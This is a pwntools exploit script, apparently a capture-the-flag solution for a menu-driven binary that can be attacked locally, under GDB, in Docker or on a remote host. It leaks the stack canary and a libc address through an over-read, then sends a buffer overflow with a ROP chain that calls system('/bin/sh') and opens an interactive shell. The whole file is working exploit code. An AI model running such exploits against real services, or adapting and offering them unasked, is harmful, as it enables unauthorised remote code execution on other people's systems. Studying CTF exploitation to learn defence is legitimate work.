#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x1491
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def recv_data(n):
    io.sendlineafter(b">", b"1")
    io.recvuntil(b"A"*n)
    data = io.recv().split(b"\n")[0]
    return data[0]


def send_data(data):
    io.sendlineafter(b">", b"2")
    io.sendafter(b": ", data)
    return recv_data(len(data))


def get_fake_canary():
    data = b"A" * 0x10
    io.sendlineafter(b">", b"2")
    io.sendafter(b": ", data)
    io.sendlineafter(b">", b"1")
    io.recvuntil(data)
    r = io.recv(64)
    return r

def get_canary():
    data = b"A" * (16 + 73)
    io.sendlineafter(b">", b"2")
    io.sendafter(b": ", data)
    io.sendlineafter(b">", b"1")
    io.recvuntil(data)
    canary = io.recv(7)
    return u64(canary.rjust(8, b"\x00"))
    # canary = b"\x00"
    # for i in range(7):
    #     canary += bytes([send_data(data)])
    #     data += b"A"
    #     io.sendline(b"4")
    # return u64(canary.rjust(8, b"\x00"))

def get_libc():
    data = b"A" * (0x20 + 72)
    io.sendlineafter(b">", b"2")
    io.sendafter(b": ", data)
    io.sendlineafter(b">", b"1")
    io.recvuntil(data)
    leak = io.recv(6)
    return u64(leak.ljust(8, b"\x00"))


def solve():

    fake = get_fake_canary()
    assert len(fake) == 0x40

    canary = get_canary()
    info("canary: %#x", canary)

    leak = get_libc()
    libc.address = leak - 0x2a1ca
    info("libc base: %#x", libc.address)

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
    sh = next(libc.search(b"/bin/sh\0"))
    system = libc.sym["system"]

    gadget = libc.address + 0x00000000000b502c # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret

    payload = b"A" * 0x10
    payload += fake
    payload += b"B" * 0x8
    payload += p64(canary)
    payload += b"C" * 8
    payload += p64(pop_rdi)
    payload += p64(sh)
    # payload += p64(pop_rdi + 1)
    # payload += p64(pop_rsi)
    # payload += p64(0)
    # payload += p64(gadget)
    # payload += p64(0) * 5
    # payload += p64(pop_rdi + 1)
    payload += p64(system)

    io.sendlineafter(b">", b"2")
    io.sendafter(b": ", payload)
    io.sendlineafter(b">", b"3")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

